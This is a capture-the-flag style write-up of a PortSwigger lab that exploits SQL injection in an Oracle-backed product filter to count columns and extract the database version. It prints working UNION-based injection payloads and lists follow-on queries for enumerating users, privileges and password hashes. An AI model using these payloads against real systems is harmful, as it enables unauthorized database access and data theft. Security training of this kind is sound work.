# Lab 4: SQL Injection Attack - Querying Database Type and Version on Oracle

## Executive Summary

This lab demonstrates SQL injection exploitation against an Oracle database where inadequate input validation in product filtering enables database enumeration and version disclosure. Through systematic column enumeration and UNION-based injection, I successfully determined the database structure (2 columns), identified Oracle-specific syntax requirements (FROM dual clause), and extracted critical database version information. The disclosed version (`Oracle Database 11g Express Edition Release 11.2.0.2.0`) provides attackers with precise intelligence for crafting targeted exploits against known vulnerabilities, enabling potential privilege escalation and complete database compromise.

## Lab Details

| Attribute              | Value |
|------------------------|-------|
| **Source**             | PortSwigger Web Security Academy |
| **Topic**              | SQL Injection |
| **Difficulty**         | Practitioner |
| **Vulnerability**      | SQL Injection - Oracle Database Enumeration |
| **Risk**               | High - Database Fingerprinting & Information Disclosure |
| **Completion**         | February 1, 2026 |

## Objective

Exploit SQL injection vulnerability to enumerate database structure, fingerprint Oracle database type, and extract version information for potential further exploitation.

## Testing Setup

**Tools Used:**
- Burp Suite Professional (Licensed to Gurpreet Singh)
- Burp Repeater for payload testing
- URL encoding for payload delivery

**Target:** Product category filtering with Oracle database backend

## Exploitation Walkthrough

### 1. Initial Reconnaissance

Accessed lab environment displaying "SQL injection attack, querying the database type and version on Oracle" challenge.

<img width="1920" height="983" alt="LAB1_ss1" src="https://github.com/user-attachments/assets/64f02e05-b594-4cab-9eed-3046459f55a0" />

*Lab 4 environment - Oracle SQL injection with Burp Suite Professional configured*

### 2. Attack Surface Identification

Explored product categories to identify SQL injection vectors and understand filtering mechanism.
<img width="1920" height="983" alt="LAB1_ss2" src="https://github.com/user-attachments/assets/e93c0c6f-4061-4bec-8ff7-2e33d4b20d92" />

*Category navigation captured - Corporate Gifts, Accessories, and other categories | GET requests showing category parameter*

**Available Categories:**
- Accessories
- Corporate Gifts
- Lifestyle
- Pens

**Request Analysis:**
```http
GET /filter?category=Corporate+gifts HTTP/1.1
Host: [lab-id].web-security-academy.net
```

**Inferred SQL Query:**
```sql
SELECT * FROM products WHERE category = 'Corporate gifts'
```

**Attack Vector Identified:** The `category` parameter directly filters database results, suggesting direct incorporation into SQL WHERE clause without sanitization.

### 3. Column Count Enumeration - Test 1

Sent category request to Burp Repeater and began systematic column enumeration using `ORDER BY` technique.

**Test Payload 1:**
```http
GET /filter?category=Corporate+gifts'+ORDER+BY+1-- HTTP/1.1
```

<img width="1920" height="983" alt="LAB1_ss3 1" src="https://github.com/user-attachments/assets/a614cdd0-ddc2-495f-9ed1-414e8150e4de" />

*ORDER BY 1 test - 200 OK response confirms at least 1 column exists*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Corporate gifts' ORDER BY 1--'
```

**Response:** 200 OK

**Analysis:** First column exists (no error when ordering by column 1).

**Column Enumeration Strategy:**
The `ORDER BY` clause attempts to sort results by column number. If the specified column doesn't exist, the database returns an error. This allows systematic column counting.

### 4. Column Count Enumeration - Test 2

**Test Payload 2:**
```http
GET /filter?category=Corporate+gifts'+ORDER+BY+2-- HTTP/1.1
```
<img width="1920" height="983" alt="LAB1_ss3 2" src="https://github.com/user-attachments/assets/90f49c19-4b4b-41a2-879a-8a697f0dfde2" />

*ORDER BY 2 test - 200 OK response confirms 2 columns exist*

**Response:** 200 OK

**Analysis:** Second column exists (query executes successfully).

### 5. Column Count Enumeration - Limit Discovery

**Test Payload 3:**
```http
GET /filter?category=Corporate+gifts'+ORDER+BY+3-- HTTP/1.1
```
<img width="1920" height="983" alt="LAB1_ss3 3" src="https://github.com/user-attachments/assets/223c33e3-b01c-4f6f-8264-ef1c67533fdd" />

*ORDER BY 3 test - Internal Server Error confirms only 2 columns exist*

**Response:** 500 Internal Server Error

**SQL Error (Inferred):**
```
ORA-01785: ORDER BY item must be the number of a SELECT-list expression
```

**Column Count Confirmed:** Exactly **2 columns** in the result set.

**UNION Injection Requirement:** All UNION SELECT statements must return 2 columns to match the original query structure.

### 6. Data Type Verification

With column count confirmed, tested data types to ensure successful UNION injection on Oracle database.

**Oracle-Specific Requirement:**
Unlike MySQL/PostgreSQL, Oracle requires a table in FROM clause even for constant selects. The `dual` table is a special one-row, one-column table present by default.

**Test Payload:**
```http
GET /filter?category=Corporate+gifts'+UNION+SELECT+'a','a'+FROM+dual-- HTTP/1.1
```
<img width="1920" height="983" alt="LAB1_ss4" src="https://github.com/user-attachments/assets/4d2d1fd9-9b01-4e5d-aa13-62892f34eef4" />

*Data type test successful - Response shows 'a' and 'a' injected into webpage, confirming both columns accept string data*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Corporate gifts' 
UNION SELECT 'a','a' FROM dual--'
```

**Response:** 200 OK with visible 'a' values in product listing

**Confirmed:**
- ✅ Both columns accept string data types
- ✅ UNION injection successful
- ✅ Oracle-specific `FROM dual` syntax required
- ✅ Injected data rendered in application output

**Why FROM dual?**
```sql
-- MySQL/PostgreSQL
SELECT 'test', 'test'  -- Works without FROM clause

-- Oracle
SELECT 'test', 'test'  -- Error: missing FROM clause
SELECT 'test', 'test' FROM dual  -- Works correctly
```

### 7. Database Version Extraction

Crafted UNION injection to extract Oracle database version information from system tables.

**Oracle Version Query:**
Oracle stores version information in the `v$version` view, which contains banner text describing database version, operating system, and build details.

**Attack Payload:**
```http
GET /filter?category=Corporate+gifts'+UNION+SELECT+banner,NULL+FROM+v$version-- HTTP/1.1
```
<img width="1920" height="983" alt="LAB1_ss5" src="https://github.com/user-attachments/assets/bfd23e30-037e-4947-bf01-8c455e4363ff" />

*Database version extraction successful (left - Burp Repeater) | Version information displayed in application (right) | Lab solved*

**SQL Query Executed:**
```sql
SELECT * FROM products WHERE category = 'Corporate gifts' 
UNION SELECT banner, NULL FROM v$version--'
```

**Version Information Extracted:**
```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
CORE 11.2.0.2.0 Production
TNS for Linux: Version 11.2.0.2.0 - Production
NLSRTL Version 11.2.0.2.0 - Production
```

**Critical Intelligence Gathered:**
- **Database:** Oracle Database 11g Express Edition
- **Version:** 11.2.0.2.0
- **Architecture:** 64-bit
- **Platform:** Linux
- **PL/SQL Version:** 11.2.0.2.0

**Complete Attack Success:**
- ✅ Database type identified (Oracle)
- ✅ Exact version disclosed (11.2.0.2.0)
- ✅ Platform fingerprinted (Linux x64)
- ✅ Foundation established for targeted exploitation

**Lab completion confirmed: "Congratulations, you solved the lab!"**

**Ethical Scope Note:** This lab focused on database fingerprinting and version disclosure. In real-world scenarios, attackers would use this information to research known vulnerabilities (CVEs), identify exploit modules, and plan privilege escalation or data exfiltration attacks. Further exploitation is not demonstrated here for ethical and legal reasons.

## Technical Impact

**Severity: High (CVSS 7.5)**
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
```

**Primary Vulnerability:**

**CWE-89: SQL Injection**
- User input directly incorporated into SQL queries
- No parameterized queries or prepared statements
- Enables database enumeration and information disclosure

**Attack Chain:**
```
Product Category Filtering
        ↓
SQL Injection via category Parameter
        ↓
Column Enumeration (ORDER BY 1,2,3...)
        ↓
Column Count: 2 columns
        ↓
Data Type Testing (UNION SELECT 'a','a')
        ↓
Oracle Syntax Confirmed (FROM dual)
        ↓
Version Extraction (v$version)
        ↓
Database Fingerprint Complete
        ↓
Intelligence for Targeted Attacks
```

**Why Database Version Disclosure is Critical:**

**1. Targeted Exploit Development:**
Knowing exact version enables:
- CVE research for known vulnerabilities
- Exploit module selection (Metasploit, SQLmap)
- Version-specific privilege escalation techniques
- Bypass methods for security patches

**2. Oracle 11g Known Vulnerabilities:**

| CVE | Description | Impact |
|-----|-------------|--------|
| CVE-2012-1675 | TNS Listener Buffer Overflow | Remote Code Execution |
| CVE-2012-0499 | Database Vault Bypass | Privilege Escalation |
| CVE-2013-3751 | XML DB Component Vulnerability | Authentication Bypass |
| CVE-2014-4237 | Java VM Component | Remote Code Execution |

**3. Attack Escalation Path:**

**Phase 1 - Information Gathering (Completed):**
- ✅ Database type: Oracle
- ✅ Version: 11.2.0.2.0
- ✅ Platform: Linux x64

**Phase 2 - Further Enumeration (Possible Next Steps):**
- Extract table names: `SELECT table_name FROM all_tables`
- Extract column names: `SELECT column_name FROM all_tab_columns`
- Identify privileges: `SELECT * FROM session_privs`
- Find DBA accounts: `SELECT username FROM dba_users`

**Phase 3 - Data Exfiltration:**
- Extract sensitive data from identified tables
- Dump password hashes from `sys.user$`
- Access customer/financial/proprietary data

**Phase 4 - Privilege Escalation:**
- Exploit known Oracle 11g vulnerabilities
- Create administrative accounts
- Execute PL/SQL for system access

**Phase 5 - Persistence & Lateral Movement:**
- Install backdoors via PL/SQL procedures
- Pivot to other systems using extracted credentials
- Maintain long-term database access

**Real-World Impact:**

| Target | Consequence |
|--------|-------------|
| **Enterprise Systems** | Complete database compromise, data exfiltration |
| **Financial Institutions** | Transaction data theft, account manipulation |
| **Healthcare** | PHI exposure, medical record theft |
| **E-Commerce** | Customer data breach, payment information theft |
| **Government** | Classified data access, intelligence compromise |

**Oracle-Specific Attack Techniques:**

**1. Oracle System Tables:**
```sql
-- User enumeration
SELECT username FROM dba_users

-- Privilege discovery
SELECT * FROM session_privs

-- Table enumeration
SELECT table_name FROM all_tables

-- Column enumeration  
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
```

**2. Oracle PL/SQL Exploitation:**
```sql
-- Execute OS commands (if Java enabled)
SELECT dbms_java.runjava('...') FROM dual

-- File operations
SELECT utl_file.get_line(...) FROM dual
```

## Key Takeaways

**Penetration Testing Methodology:**
- Systematic column enumeration using ORDER BY
- Database-specific syntax identification
- UNION-based injection for data extraction
- System table querying for version disclosure
- Platform and version fingerprinting

**Critical Security Insights:**

**1. Information Disclosure Enables Targeted Attacks:**
Version disclosure provides attackers with:
- Specific CVE targets
- Exploit compatibility information
- Bypass technique selection
- Attack surface understanding

**2. Database-Specific Syntax Matters:**

| Database | NULL Selection | Comment Syntax |
|----------|----------------|----------------|
| **Oracle** | `SELECT NULL FROM dual` | `--` or `/* */` |
| MySQL | `SELECT NULL` | `#` or `--` or `/* */` |
| PostgreSQL | `SELECT NULL` | `--` or `/* */` |
| MSSQL | `SELECT NULL` | `--` or `/* */` |

**3. Column Enumeration Techniques:**

**ORDER BY Method (Used in Lab):**
```sql
' ORDER BY 1--  (Success = ≥1 column)
' ORDER BY 2--  (Success = ≥2 columns)  
' ORDER BY 3--  (Error = exactly 2 columns)
```

**UNION NULL Method:**
```sql
' UNION SELECT NULL--        (Error = wrong column count)
' UNION SELECT NULL,NULL--   (Success = 2 columns)
```

**4. Oracle-Specific Enumeration Queries:**
```sql
-- Database version
SELECT banner FROM v$version

-- Current database user
SELECT user FROM dual

-- Database name
SELECT name FROM v$database

-- Database privileges
SELECT * FROM session_privs
```

**5. Defense Requires Multiple Layers:**

**Application Level:**
- Parameterized queries (mandatory)
- Input validation and sanitization
- Least privilege database accounts

**Database Level:**
- Restrict access to system tables (v$version, dba_users, etc.)
- Database activity monitoring
- Audit logging enabled

**Network Level:**
- Web Application Firewall (WAF)
- Intrusion Detection Systems
- Database firewall rules

**Professional Skills Demonstrated:**
- Systematic database enumeration methodology
- Database-specific syntax knowledge (Oracle FROM dual requirement)
- UNION-based SQL injection techniques
- System table exploitation for information gathering
- Version fingerprinting for attack planning

## References

1. PortSwigger Web Security Academy - SQL Injection
2. OWASP Top 10 (2021) - A03: Injection
3. CWE-89 - SQL Injection
4. Oracle Database 11g Security Guide
5. OWASP SQL Injection Prevention Cheat Sheet

---

## Legal Notice

**Copyright © 2025 Gurpreet Singh**  
Licensed under CC BY-NC-ND 4.0

**Repository:** https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs

**Disclaimer:** This documentation is for authorized security testing and educational purposes only. All techniques were performed in a controlled laboratory environment with explicit permission. Database version information was disclosed for educational demonstration only. Unauthorized access to systems, databases, or exploitation of disclosed vulnerabilities is illegal under applicable laws worldwide. This research does not advocate or provide guidance for unauthorized system access.
